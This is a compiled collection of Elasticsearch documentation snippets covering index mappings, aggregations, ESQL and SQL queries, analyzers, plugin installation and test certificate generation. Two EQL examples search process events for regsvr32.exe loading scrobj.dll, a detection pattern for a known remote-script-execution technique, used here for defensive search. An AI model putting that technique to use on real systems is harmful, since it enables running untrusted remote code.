    "foo": "bar"
  },
  "meta": {
    "name": "Some metric",
    "description": "Some metric description",
    "other": {
      "foo": "one",
      "baz": "two"
    }
  }
}

GET logs/_search
{
  "query": {
    "match": {
      "meta.other.foo": "one"
    }
  }
}

----------------------------------------

TITLE: Using Synthetic _source with Binary Fields in Elasticsearch
DESCRIPTION: This example shows how to create an index with synthetic _source enabled and index a document with multiple binary values. Synthetic _source may sort binary values based on their byte representation.

LANGUAGE: console
CODE:
PUT idx
{
  "settings": {
    "index": {
      "mapping": {
        "source": {
          "mode": "synthetic"
        }
      }
    }
  },
  "mappings": {
    "properties": {
      "binary": { "type": "binary", "doc_values": true }
    }
  }
}
PUT idx/_doc/1
{
  "binary": ["IAA=", "EAA="]
}

----------------------------------------

TITLE: Basic Min Aggregation Query in Elasticsearch
DESCRIPTION: Example showing how to compute the minimum price value across all documents in a sales index.

LANGUAGE: console
CODE:
POST /sales/_search?size=0
{
  "aggs": {
    "min_price": { "min": { "field": "price" } }
  }
}

----------------------------------------

TITLE: Sample Response for T-Shirt Sales Percentage Calculation in Elasticsearch
DESCRIPTION: Illustrates the expected response format from Elasticsearch when using the bucket script aggregation to calculate t-shirt sales percentages, showing aggregated results for multiple time buckets.

LANGUAGE: console-result
CODE:
{
   "took": 11,
   "timed_out": false,
   "_shards": ...,
   "hits": ...,
   "aggregations": {
      "sales_per_month": {
         "buckets": [
            {
               "key_as_string": "2015/01/01 00:00:00",
               "key": 1420070400000,
               "doc_count": 3,
               "total_sales": {
                   "value": 550.0
               },
               "t-shirts": {
                   "doc_count": 1,
                   "sales": {
                       "value": 200.0
                   }
               },
               "t-shirt-percentage": {
                   "value": 36.36363636363637
               }
            },
            {
               "key_as_string": "2015/02/01 00:00:00",
               "key": 1422748800000,
               "doc_count": 2,
               "total_sales": {
                   "value": 60.0
               },
               "t-shirts": {
                   "doc_count": 1,
                   "sales": {
                       "value": 10.0
                   }
               },
               "t-shirt-percentage": {
                   "value": 16.666666666666664
               }
            },
            {
               "key_as_string": "2015/03/01 00:00:00",
               "key": 1425168000000,
               "doc_count": 2,
               "total_sales": {
                   "value": 375.0
               },
               "t-shirts": {
                   "doc_count": 1,
                   "sales": {
                       "value": 175.0
                   }
               },
               "t-shirt-percentage": {
                   "value": 46.666666666666664
               }
            }
         ]
      }
   }
}

----------------------------------------

TITLE: Defining MIN Aggregation Function in ESQL
DESCRIPTION: This code snippet defines the MIN aggregation function in ESQL. It converts a multivalued expression into a single valued column containing the minimum value. This is generated automatically by ESQL's AbstractFunctionTestCase and should not be edited manually.

LANGUAGE: sql
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

----------------------------------------

TITLE: Defining and Using Point Fields in Elasticsearch
DESCRIPTION: This snippet demonstrates how to define a mapping with a 'point' field and insert documents using various formats for point data, including GeoJSON, WKT, object, array, and string representations.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "location": {
        "type": "point"
      }
    }
  }
}

PUT my-index-000001/_doc/1
{
  "text": "Point as an object using GeoJSON format",
  "location": {
    "type": "Point",
    "coordinates": [-71.34, 41.12]
  }
}

PUT my-index-000001/_doc/2
{
  "text": "Point as a WKT POINT primitive",
  "location" : "POINT (-71.34 41.12)"
}

PUT my-index-000001/_doc/3
{
  "text": "Point as an object with 'x' and 'y' keys",
  "location": {
    "x": -71.34,
    "y": 41.12
  }
}

PUT my-index-000001/_doc/4
{
  "text": "Point as an array",
  "location": [ -71.34, 41.12 ]
}

PUT my-index-000001/_doc/5
{
  "text": "Point as a string",
  "location": "-71.34,41.12"
}

----------------------------------------

TITLE: Basic SELECT Statement Structure in Elasticsearch SQL
DESCRIPTION: Demonstrates the overall structure of a SELECT statement in Elasticsearch SQL, including optional clauses like TOP, FROM, WHERE, GROUP BY, HAVING, ORDER BY, LIMIT, and PIVOT.

LANGUAGE: sql
CODE:
SELECT [TOP [ count ] ] select_expr [, ...]
[ FROM table_name ]
[ WHERE condition ]
[ GROUP BY grouping_element [, ...] ]
[ HAVING condition]
[ ORDER BY expression [ ASC | DESC ] [, ...] ]
[ LIMIT [ count ] ]
[ PIVOT ( aggregation_expr FOR column IN ( value [ [ AS ] alias ] [, ...] ) ) ]

----------------------------------------

TITLE: Basic Sum Aggregation Query
DESCRIPTION: Demonstrates how to perform a basic sum aggregation on a price field for documents matching a specific type.

LANGUAGE: console
CODE:
POST /sales/_search?size=0
{
  "query": {
    "constant_score": {
      "filter": {
        "match": { "type": "hat" }
      }
    }
  },
  "aggs": {
    "hat_prices": { "sum": { "field": "price" } }
  }
}

----------------------------------------

TITLE: Searching for a sequence of events with EQL in Elasticsearch
DESCRIPTION: Shows how to use EQL sequence syntax to search for a series of ordered events in Elasticsearch.

LANGUAGE: JSON
CODE:
GET /my-data-stream/_eql/search
{
  "query": """
    sequence
      [ process where process.name == "regsvr32.exe" ]
      [ file where stringContains(file.name, "scrobj.dll") ]
  """
}

----------------------------------------

TITLE: Geographic Hotspot Analysis
DESCRIPTION: Example demonstrating how to identify crime hotspots using geohash grid aggregation combined with significant terms.

LANGUAGE: console
CODE:
GET /_search
{
  "aggs": {
    "hotspots": {
      "geohash_grid": {
        "field": "location",
        "precision": 5
      },
      "aggs": {
        "significant_crime_types": {
          "significant_terms": { "field": "crime_type" }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Creating Basic Semantic Text Index with Default Endpoint
DESCRIPTION: Creates an Elasticsearch index with a semantic_text field using the default .elser-2-elasticsearch inference endpoint.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "inference_field": {
        "type": "semantic_text"
      }
    }
  }
}

----------------------------------------

TITLE: Installing Core Elasticsearch Plugins using Command Line
DESCRIPTION: This snippet demonstrates how to install core Elasticsearch plugins using the elasticsearch-plugin command-line tool. It shows the general syntax and a specific example for installing the ICU plugin.

LANGUAGE: shell
CODE:
sudo bin/elasticsearch-plugin install [plugin_name]

LANGUAGE: shell
CODE:
sudo bin/elasticsearch-plugin install analysis-icu

----------------------------------------

TITLE: Categorizing Employee Language Skills with CASE in ESQL
DESCRIPTION: Uses CASE statement to classify employees as monolingual, bilingual, or polyglot based on the number of languages they speak. Returns employee number, language count, and classification type.

LANGUAGE: esql
CODE:
FROM employees
| EVAL type = CASE(
    languages <= 1, "monolingual",
    languages <= 2, "bilingual",
     "polyglot")
| KEEP emp_no, languages, type

----------------------------------------

TITLE: Analyzing Text with Classic Token Filter in Elasticsearch
DESCRIPTION: This example demonstrates how to use the Classic token filter with the analyze API. It tokenizes and filters a sample text, removing possessives and dots from acronyms.

LANGUAGE: console
CODE:
GET /_analyze
{
  "tokenizer" : "classic",
  "filter" : ["classic"],
  "text" : "The 2 Q.U.I.C.K. Brown-Foxes jumped over the lazy dog's bone."
}

----------------------------------------

TITLE: Scoring with Float Rank Vectors using Script Score Query in Elasticsearch
DESCRIPTION: Demonstrates how to use a script_score query to score documents based on the maxSim similarity between a query vector and stored float rank vectors.

LANGUAGE: console
CODE:
GET my-rank-vectors-float/_search
{
  "query": {
    "script_score": {
      "query": {
        "match_all": {}
      },
      "script": {
        "source": "maxSimDotProduct(params.query_vector, 'my_vector')",
        "params": {
          "query_vector": [[0.5, 10, 6], [-0.5, 10, 10]]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Configuring Gmail Notifications in Elasticsearch
DESCRIPTION: Configuration requirements for enabling Gmail email notifications in Elasticsearch, requiring SMTP password storage in keystore as a secure setting and xpack.notification.email settings configuration.



----------------------------------------

TITLE: Basic Date Range Aggregation Example
DESCRIPTION: Demonstrates how to create date range buckets using date math expressions and custom formatting. Shows aggregation of documents into before and after ranges based on a 10-month lookback period.

LANGUAGE: console
CODE:
POST /sales/_search?size=0
{
  "aggs": {
    "range": {
      "date_range": {
        "field": "date",
        "format": "MM-yyyy",
        "ranges": [
          { "to": "now-10M/M" },
          { "from": "now-10M/M" }
        ]
      }
    }
  }
}

----------------------------------------

TITLE: Initializing and Querying Geo-distance Aggregation in Elasticsearch
DESCRIPTION: This snippet demonstrates how to set up an index with geo_point fields, insert sample data, and perform a geo-distance aggregation query. It shows the basic structure of the aggregation and how to define distance ranges.

LANGUAGE: console
CODE:
PUT /museums
{
  "mappings": {
    "properties": {
      "location": {
        "type": "geo_point"
      }
    }
  }
}

POST /museums/_bulk?refresh
{"index":{"_id":1}}
{"location": "POINT (4.912350 52.374081)", "name": "NEMO Science Museum"}
{"index":{"_id":2}}
{"location": "POINT (4.901618 52.369219)", "name": "Museum Het Rembrandthuis"}
{"index":{"_id":3}}
{"location": "POINT (4.914722 52.371667)", "name": "Nederlands Scheepvaartmuseum"}
{"index":{"_id":4}}
{"location": "POINT (4.405200 51.222900)", "name": "Letterenhuis"}
{"index":{"_id":5}}
{"location": "POINT (2.336389 48.861111)", "name": "Musée du Louvre"}
{"index":{"_id":6}}
{"location": "POINT (2.327000 48.860000)", "name": "Musée d'Orsay"}

POST /museums/_search?size=0
{
  "aggs": {
    "rings_around_amsterdam": {
      "geo_distance": {
        "field": "location",
        "origin": "POINT (4.894 52.3760)",
        "ranges": [
          { "to": 100000 },
          { "from": 100000, "to": 300000 },
          { "from": 300000 }
        ]
      }
    }
  }
}

----------------------------------------

TITLE: Defining Inner Hits in Elasticsearch Query
DESCRIPTION: This snippet shows the basic structure for defining inner hits in an Elasticsearch query. It demonstrates how to include an inner_hits definition within a nested, has_child, or has_parent query.

LANGUAGE: js
CODE:
"<query>" : {
    "inner_hits" : {
        <inner_hits_options>
    }
}

----------------------------------------

TITLE: Querying with Reverse Nested Aggregation in Elasticsearch
DESCRIPTION: This example demonstrates a search query using nested and reverse nested aggregations. It retrieves top commenters' usernames and the top tags of issues they've commented on, showcasing how to break out of the nested structure.

LANGUAGE: console
CODE:
GET /issues/_search
{
  "query": {
    "match_all": {}
  },
  "aggs": {
    "comments": {
      "nested": {
        "path": "comments"
      },
      "aggs": {
        "top_usernames": {
          "terms": {
            "field": "comments.username"
          },
          "aggs": {
            "comment_to_issue": {
              "reverse_nested": {}, <1>
              "aggs": {
                "top_tags_per_comment": {
                  "terms": {
                    "field": "tags"
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Multi-Fields with Multiple Analyzers in Elasticsearch
DESCRIPTION: This snippet illustrates how to use multi-fields with multiple analyzers for better relevance. It creates an index with a field analyzed by both the 'standard' and 'english' analyzers, indexes documents, and performs a multi-match query across both fields.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "text": {
        "type": "text",
        "fields": {
          "english": {
            "type":     "text",
            "analyzer": "english"
          }
        }
      }
    }
  }
}

PUT my-index-000001/_doc/1
{ "text": "quick brown fox" }

PUT my-index-000001/_doc/2
{ "text": "quick brown foxes" }

GET my-index-000001/_search
{
  "query": {
    "multi_match": {
      "query": "quick brown foxes",
      "fields": [
        "text",
        "text.english"
      ],
      "type": "most_fields"
    }
  }
}

----------------------------------------

TITLE: Using a Custom Highlight Query
DESCRIPTION: Shows how to use a highlight_query to customize which terms are highlighted, including both search and rescore queries.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "match": {
      "comment": {
        "query": "foo bar"
      }
    }
  },
  "rescore": {
    "window_size": 50,
    "query": {
      "rescore_query": {
        "match_phrase": {
          "comment": {
            "query": "foo bar",
            "slop": 1
          }
        }
      },
      "rescore_query_weight": 10
    }
  },
  "_source": false,
  "highlight": {
    "order": "score",
    "fields": {
      "comment": {
        "fragment_size": 150,
        "number_of_fragments": 3,
        "highlight_query": {
          "bool": {
            "must": {
              "match": {
                "comment": {
                  "query": "foo bar"
                }
              }
            },
            "should": {
              "match_phrase": {
                "comment": {
                  "query": "foo bar",
                  "slop": 1,
                  "boost": 10.0
                }
              }
            },
            "minimum_should_match": 0
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Boosting Documents Based on Date Using Distance Feature Query in Elasticsearch
DESCRIPTION: This example demonstrates a bool search that matches documents with the name 'chocolate' and uses a distance_feature query to boost the relevance of documents with a production_date closer to the current date.

LANGUAGE: console
CODE:
GET /items/_search
{
  "query": {
    "bool": {
      "must": {
        "match": {
          "name": "chocolate"
        }
      },
      "should": {
        "distance_feature": {
          "field": "production_date",
          "pivot": "7d",
          "origin": "now"
        }
      }
    }
  }
}

----------------------------------------

TITLE: Basic Highlighting Example in Elasticsearch
DESCRIPTION: A simple example of enabling highlighting on the 'content' field in an Elasticsearch search query.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "match": { "content": "kimchy" }
  },
  "highlight": {
    "fields": {
      "content": {}
    }
  }
}

----------------------------------------

TITLE: Creating Multi-Field Mappings for Text Fields
DESCRIPTION: Example of creating a multi-field mapping with both text and keyword fields for efficient searching and aggregation.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "my_field": {
        "type": "text",
        "fields": {
          "keyword": {
            "type": "keyword"
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Running a basic EQL search in Elasticsearch
DESCRIPTION: Demonstrates how to run a basic EQL query to search for process events in Elasticsearch using the EQL search API.

LANGUAGE: JSON
CODE:
GET /my-data-stream/_eql/search
{
  "query": """
    process where process.name == "regsvr32.exe"
  """
}

----------------------------------------

TITLE: Creating Token Filter Factory for Elasticsearch
DESCRIPTION: This Java class implements a TokenFilterFactory to provide the custom HelloWorldTokenFilter to Elasticsearch. It uses the @NamedComponent annotation to register the filter with the name 'hello_world'.

LANGUAGE: java
CODE:
package org.example;

import org.apache.lucene.analysis.TokenStream;
import org.elasticsearch.plugin.analysis.TokenFilterFactory;
import org.elasticsearch.plugin.NamedComponent;

@NamedComponent(value = "hello_world")
public class HelloWorldTokenFilterFactory implements TokenFilterFactory {

    @Override
    public TokenStream create(TokenStream tokenStream) {
        return new HelloWorldTokenFilter(tokenStream);
    }

}

----------------------------------------

TITLE: Customizing Stemmer Filter with Language Settings
DESCRIPTION: Example of creating a custom stemmer filter with specific language settings. Shows how to configure a light German stemming algorithm with a custom analyzer.

LANGUAGE: console
CODE:
PUT /my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_analyzer": {
          "tokenizer": "standard",
          "filter": [
            "lowercase",
            "my_stemmer"
          ]
        }
      },
      "filter": {
        "my_stemmer": {
          "type": "stemmer",
          "language": "light_german"
        }
      }
    }
  }
}

----------------------------------------

TITLE: Creating Custom Normalizer in Elasticsearch
DESCRIPTION: Shows how to create a custom normalizer with lowercase and ASCII folding filters, apply it to a keyword field, and demonstrates its effect on indexing and searching documents.

LANGUAGE: console
CODE:
PUT index
{
  "settings": {
    "analysis": {
      "normalizer": {
        "my_normalizer": {
          "type": "custom",
          "char_filter": [],
          "filter": ["lowercase", "asciifolding"]
        }
      }
    }
  },
  "mappings": {
    "properties": {
      "foo": {
        "type": "keyword",
        "normalizer": "my_normalizer"
      }
    }
  }
}

PUT index/_doc/1
{
  "foo": "BÀR"
}

PUT index/_doc/2
{
  "foo": "bar"
}

PUT index/_doc/3
{
  "foo": "baz"
}

POST index/_refresh

GET index/_search
{
  "query": {
    "term": {
      "foo": "BAR"
    }
  }
}

GET index/_search
{
  "query": {
    "match": {
      "foo": "BAR"
    }
  }
}

----------------------------------------

TITLE: Configuring UAX URL Email Tokenizer with Custom Settings
DESCRIPTION: Example showing how to configure the UAX URL Email tokenizer with a custom max_token_length setting and analyze text using the custom configuration.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_analyzer": {
          "tokenizer": "my_tokenizer"
        }
      },
      "tokenizer": {
        "my_tokenizer": {
          "type": "uax_url_email",
          "max_token_length": 5
        }
      }
    }
  }
}

POST my-index-000001/_analyze
{
  "analyzer": "my_analyzer",
  "text": "john.smith@global-international.com"
}

LANGUAGE: text
CODE:
[ john, smith, globa, l, inter, natio, nal.c, om ]

----------------------------------------

TITLE: Creating a Regular Expression Pattern in Painless
DESCRIPTION: Demonstrates how to create a constant regular expression pattern in Painless. This is the only supported method for creating patterns, ensuring fast performance through efficient compilation.

LANGUAGE: painless
CODE:
Pattern p = /[aeiou]/

----------------------------------------

TITLE: Adding a New User with Roles in Elasticsearch
DESCRIPTION: This example demonstrates how to add a new user named 'jacknich' with a password and assigned roles using the elasticsearch-users command.

LANGUAGE: shell
CODE:
bin/elasticsearch-users useradd jacknich -p theshining -r network,monitoring

----------------------------------------

TITLE: Configuring Phonetic Token Filter with Metaphone Encoder in Elasticsearch
DESCRIPTION: Example showing how to configure an index with a custom analyzer using the phonetic token filter with metaphone encoding. The setup includes creating an analyzer with standard tokenizer, lowercase filter, and metaphone phonetic encoding that preserves original tokens.

LANGUAGE: console
CODE:
PUT phonetic_sample
{
  "settings": {
    "index": {
      "analysis": {
        "analyzer": {
          "my_analyzer": {
            "tokenizer": "standard",
            "filter": [
              "lowercase",
              "my_metaphone"
            ]
          }
        },
        "filter": {
          "my_metaphone": {
            "type": "phonetic",
            "encoder": "metaphone",
            "replace": false
          }
        }
      }
    }
  }
}

GET phonetic_sample/_analyze
{
  "analyzer": "my_analyzer",
  "text": "Joe Bloggs"
}

----------------------------------------

TITLE: LIKE with Escape Character in Elasticsearch SQL
DESCRIPTION: Example of using LIKE operator with an escape character to match literal wildcard characters.

LANGUAGE: sql
CODE:
SELECT name, author FROM library WHERE name LIKE 'Dune/%' ESCAPE '/';

----------------------------------------

TITLE: Setting Up Parent-Child Index Mapping in Elasticsearch
DESCRIPTION: Example showing how to create an index with a join field mapping to establish parent-child relationships between documents. Defines a parent-child relation and includes a tag field of type keyword.

LANGUAGE: console
CODE:
PUT /my-index-000001
{
  "mappings": {
    "properties": {
      "my-join-field": {
        "type": "join",
        "relations": {
          "parent": "child"
        }
      },
      "tag": {
        "type": "keyword"
      }
    }
  }
}

----------------------------------------

TITLE: Using MATCH Function in ESQL Query
DESCRIPTION: Demonstrates how to use the MATCH function to search for books by author 'Faulkner'. The query selects specific fields, sorts by book number, and limits results to 5 entries.

LANGUAGE: sql
CODE:
FROM books
| WHERE MATCH(author, "Faulkner")
| KEEP book_no, author
| SORT book_no
| LIMIT 5

----------------------------------------

TITLE: RLIKE Pattern Matching Example in Elasticsearch SQL
DESCRIPTION: Example of using RLIKE operator with regular expression to search for book names containing 'Child' followed by any characters and then 'Dune'.

LANGUAGE: sql
CODE:
SELECT author, name FROM library WHERE name RLIKE 'Child.* Dune';

    author     |      name
---------------+----------------
Frank Herbert  |Children of Dune

----------------------------------------

TITLE: Creating and Managing SSL Certificates for Elasticsearch
DESCRIPTION: Shell script that generates CA certificates, client certificates, and performs various certificate format conversions. The script creates multiple test CAs, generates client certificates, and converts them between PEM, PKCS#12, and JKS formats. It includes password protection and key management operations.

LANGUAGE: bash
CODE:
#!/bin/bash
#
# This is README describes how the certificates in this directory were created.
# This file can also be executed as a script
#

# 1. Create first CA PEM ("ca1")

elasticsearch-certutil ca --pem --out ca1.zip --days 9999 --ca-dn "CN=Test CA 1"
unzip ca1.zip 
mv ca ca1

# 2. Create first CA PEM ("ca2")

elasticsearch-certutil ca --pem --out ca2.zip --days 9999 --ca-dn "CN=Test CA 2"
unzip ca2.zip 
mv ca ca2

# 3. Create first CA PEM ("ca3")

elasticsearch-certutil ca --pem --out ca3.zip --days 9999 --ca-dn "CN=Test CA 3"
unzip ca3.zip 
mv ca ca3

# 4. Create "cert1" PEM

elasticsearch-certutil cert --pem --out cert1.zip --name cert1 --ip 127.0.0.1 --dns localhost --days 9999 --ca-key ca1/ca.key --ca-cert ca1/ca.crt
unzip cert1.zip

# 5. Create "cert2" PEM (same as cert1, but with a password)

elasticsearch-certutil cert --pem --out cert2.zip --name cert2 --ip 127.0.0.1 --dns localhost --days 9999 --ca-key ca1/ca.key --ca-cert ca1/ca.crt --pass "c2-pass"
unzip cert2.zip

# 6. Convert CAs to PKCS#12

for n in 1 2 3
do
    keytool -importcert -file ca${n}/ca.crt -alias ca -keystore ca${n}/ca.p12 -storetype PKCS12 -storepass p12-pass -v 
    keytool -importcert -file ca${n}/ca.crt -alias ca${n} -keystore ca-all/ca.p12 -storetype PKCS12 -storepass p12-pass -v 
done

# 7. Convert CAs to JKS

for n in 1 2 3
do
    keytool -importcert -file ca${n}/ca.crt -alias ca${n} -keystore ca-all/ca.jks -storetype jks -storepass jks-pass -v 
done

# 8. Convert Certs to PKCS#12

for Cert in cert1 cert2 
do
    openssl pkcs12 -export -out $Cert/$Cert.p12 -inkey $Cert/$Cert.key -in $Cert/$Cert.crt -name $Cert -passout pass:p12-pass 
done

# 9. Import Certs into single PKCS#12 keystore

for Cert in cert1 cert2 
do
    keytool -importkeystore -noprompt \
            -srckeystore $Cert/$Cert.p12 -srcstoretype PKCS12 -srcstorepass p12-pass  \
            -destkeystore cert-all/certs.p12 -deststoretype PKCS12 -deststorepass p12-pass
done

# 10. Import Certs into single JKS keystore with separate key-password

for Cert in cert1 cert2 
do
    keytool -importkeystore -noprompt \
            -srckeystore $Cert/$Cert.p12 -srcstoretype PKCS12 -srcstorepass p12-pass  \
            -destkeystore cert-all/certs.jks -deststoretype jks -deststorepass jks-pass
    keytool -keypasswd -keystore cert-all/certs.jks -alias $Cert -keypass p12-pass -new key-pass -storepass jks-pass
done

# 11. Create a mimic of the first CA ("ca1b") for testing certificates with the same name but different keys

elasticsearch-certutil ca --pem --out ${PWD}/ca1-b.zip --days 9999 --ca-dn "CN=Test CA 1"
unzip ca1-b.zip
mv ca ca1-b

# 12. Convert certifcate keys to pkcs8

openssl pkcs8 -topk8 -inform PEM -in cert1/cert1.key -outform PEM -out cert1/cert1-pkcs8.key -nocrypt
openssl pkcs8 -topk8 -inform PEM -in cert2/cert2.key -outform PEM -out cert2/cert2-pkcs8.key -passin pass:"c2-pass" -passout pass:"c2-pass"

----------------------------------------

TITLE: Configuring Stored Fields in Elasticsearch Mapping
DESCRIPTION: Demonstrates how to create an index mapping with stored fields for title and date, while leaving content unstored. Shows how to index a document and retrieve only stored fields using stored_fields parameter in search.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "title": {
        "type": "text",
        "store": true
      },
      "date": {
        "type": "date",
        "store": true
      },
      "content": {
        "type": "text"
      }
    }
  }
}

PUT my-index-000001/_doc/1
{
  "title":   "Some short title",
  "date":    "2015-01-01",
  "content": "A very long content field..."
}

GET my-index-000001/_search
{
  "stored_fields": [ "title", "date" ]
}

----------------------------------------

TITLE: String Stats with Runtime Fields
DESCRIPTION: Demonstrates using string_stats aggregation with a runtime field to analyze combined values from multiple fields. Creates a custom runtime field that concatenates message and context fields.

LANGUAGE: console
CODE:
POST /my-index-000001/_search
{
  "size": 0,
  "runtime_mappings": {
    "message_and_context": {
      "type": "keyword",
      "script": """
        emit(doc['message.keyword'].value + ' ' + doc['context.keyword'].value)
      """
    }
  },
  "aggs": {
    "message_stats": {
      "string_stats": { "field": "message_and_context" }
    }
  }
}

----------------------------------------

TITLE: Configuring Single Field Index Sorting in Elasticsearch
DESCRIPTION: Example showing how to create an index with sorting configured on a single date field in descending order. Demonstrates basic index sort configuration with field and order settings.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "settings": {
    "index": {
      "sort.field": "date",
      "sort.order": "desc"
    }
  },
  "mappings": {
    "properties": {
      "date": {
        "type": "date"
      }
    }
  }
}

----------------------------------------

TITLE: Analyzing Text with Synonym Graph and Flatten Graph Filters in Elasticsearch
DESCRIPTION: This example demonstrates how to use the analyze API with synonym_graph and flatten_graph filters to process the text 'domain name system is fragile'. It shows the effect of flattening a token graph with multi-position synonyms.

LANGUAGE: json
CODE:
GET /_analyze
{
  "tokenizer": "standard",
  "filter": [
    {
      "type": "synonym_graph",
      "synonyms": [ "internet phonebook, domain name system" ]
    },
    "flatten_graph"
  ],
  "text": "domain name system is fragile"
}

----------------------------------------

TITLE: Creating GeoIP Pipeline with Default City Database
DESCRIPTION: Example of creating an ingest pipeline with GeoIP processor using the default city database to add geographical information based on IP addresses.

LANGUAGE: console
CODE:
PUT _ingest/pipeline/geoip
{
  "description" : "Add ip geolocation info",
  "processors" : [
    {
      "geoip" : {
        "field" : "ip"
      }
    }
  ]
}
PUT my-index-000001/_doc/my_id?pipeline=geoip
{
  "ip": "89.160.20.128"
}
GET my-index-000001/_doc/my_id

----------------------------------------

TITLE: Multi-Route Search in Elasticsearch
DESCRIPTION: Example showing how to search across multiple routing values using comma-separated values.

LANGUAGE: console
CODE:
GET /my-index-000001/_search?routing=my-routing-value,my-routing-value-2
{
  "query": {
    "match": {
      "user.id": "kimchy"
    }
  }
}

----------------------------------------

TITLE: RRF Search Query with Multiple Standard Retrievers
DESCRIPTION: Elasticsearch query using RRF to combine results from a BM25 query and an ELSER semantic search query.

LANGUAGE: console
CODE:
GET example-index/_search
{
    "retriever": {
        "rrf": { 
            "retrievers": [
                {
                    "standard": { 
                        "query": {
                            "term": {
                                "text": "blue shoes sale"
                            }
                        }
                    }
                },
                {
                    "standard": { 
                        "query": {
                            "sparse_vector":{
                                "field": "ml.tokens",
                                "inference_id": "my_elser_model",
                                "query": "What blue shoes are on sale?"
                            }
                        }
                    }
                }
            ],
            "rank_window_size": 50,
            "rank_constant": 20
        }
    }
}

----------------------------------------

TITLE: Applying Negation in Elasticsearch SQL
DESCRIPTION: Illustrates the use of the unary negation operator (-) in an Elasticsearch SQL query. This operation changes the sign of a numeric value.

LANGUAGE: sql
CODE:
SELECT - 1 AS x;

----------------------------------------

TITLE: Executing Has Parent Query in Elasticsearch
DESCRIPTION: Query example demonstrating how to search for child documents whose parent documents match specific criteria. Searches for children whose parents have a specific tag value.

LANGUAGE: console
CODE:
GET /my-index-000001/_search
{
  "query": {
    "has_parent": {
      "parent_type": "parent",
      "query": {
        "term": {
          "tag": {
            "value": "Elasticsearch"
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Creating MongoDB Connector via Elasticsearch API
DESCRIPTION: Example of using the Elasticsearch API to create a new self-managed MongoDB connector. This snippet demonstrates the basic structure and required fields for the API call.

LANGUAGE: json
CODE:
PUT _connector/my-mongodb-connector
{
  "index_name": "my-elasticsearch-index",
  "name": "Content synced from MongoDB",
  "service_type": "mongodb"
}

----------------------------------------

TITLE: Mapping a geo_shape Field in Elasticsearch
DESCRIPTION: Example of mapping a location field as geo_shape type in an Elasticsearch index.

LANGUAGE: console
CODE:
PUT /example
{
  "mappings": {
    "properties": {
      "location": {
        "type": "geo_shape"
      }
    }
  }
}

----------------------------------------

TITLE: Creating Elasticsearch Index with Term Vector Configuration
DESCRIPTION: This snippet demonstrates how to create an Elasticsearch index with a text field that has term vectors enabled. It sets the term_vector option to 'with_positions_offsets' to store terms, positions, and character offsets.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "text": {
        "type":        "text",
        "term_vector": "with_positions_offsets"
      }
    }
  }
}

----------------------------------------

TITLE: Basic Match Boolean Prefix Query in Elasticsearch
DESCRIPTION: Demonstrates a basic match_bool_prefix query that analyzes input text and creates term queries for all terms except the last, which becomes a prefix query.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "match_bool_prefix" : {
      "message" : "quick brown f"
    }
  }
}

----------------------------------------

TITLE: Computing Maximum Value Using ESQL MAX Function
DESCRIPTION: Example showing how to use the MAX function in ESQL to find the maximum value of the 'languages' field from the employees table. The query uses the STATS clause to perform the aggregation.

LANGUAGE: sql
CODE:
FROM employees
| STATS MAX(languages)

----------------------------------------

TITLE: Using CONCAT Function in Elasticsearch SQL
DESCRIPTION: Concatenates two string expressions. The resulting string cannot exceed 1 MB in byte length.

LANGUAGE: sql
CODE:
SELECT CONCAT('Elasticsearch', ' SQL');

CONCAT('Elasticsearch', ' SQL')
-------------------------------
Elasticsearch SQL

----------------------------------------

TITLE: Executing a Constant Score Query in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use a constant score query with a term filter in an Elasticsearch search request. It filters documents where the user.id field equals 'kimchy' and assigns a boost of 1.2 to matching documents.

LANGUAGE: json
CODE:
{
  "query": {
    "constant_score": {
      "filter": {
        "term": { "user.id": "kimchy" }
      },
      "boost": 1.2
    }
  }
}

----------------------------------------

TITLE: Updating Document Fields with Painless Script in Elasticsearch
DESCRIPTION: This example demonstrates how to use a Painless script in an Elasticsearch update operation. The script marks a document as sold and sets its cost to the actual price paid after discounts.

LANGUAGE: json
CODE:
POST /seats/_update/3
{
  "script": {
    "source": "ctx._source.sold = true; ctx._source.cost = params.sold_cost",
    "lang": "painless",
    "params": {
      "sold_cost": 26
    }
  }
}

----------------------------------------

TITLE: Hybrid Vector and Text Search in Elasticsearch
DESCRIPTION: Demonstrates hybrid search combining kNN vector search with text matching using bool query with should clauses.

LANGUAGE: console
CODE:
POST my-image-index/_search
{
  "size" : 3,
  "query": {
    "bool": {
      "should": [
        {
          "match": {
            "title": {
              "query": "mountain lake",
              "boost": 1
            }
          }
        },
        {
          "knn": {
            "field": "image-vector",
            "query_vector": [-5, 9, -12],
            "k": 10,
            "boost": 2
          }
        }
      ]
    }
  }
}

----------------------------------------

TITLE: Multiple Field Types Top Metrics Example
DESCRIPTION: Shows how to use top_metrics aggregation with multiple field types including date, integer, and keyword fields.

LANGUAGE: console
CODE:
PUT /test
{
  "mappings": {
    "properties": {
      "d": {"type": "date"}
    }
  }
}
POST /test/_bulk?refresh
{"index": {}}
{"s": 1, "m": 3.1415, "i": 1, "d": "2020-01-01T00:12:12Z", "t": "cat"}
{"index": {}}
{"s": 2, "m": 1.0, "i": 6, "d": "2020-01-02T00:12:12Z", "t": "dog"}
{"index": {}}
{"s": 3, "m": 2.71828, "i": -12, "d": "2019-12-31T00:12:12Z", "t": "chicken"}

----------------------------------------

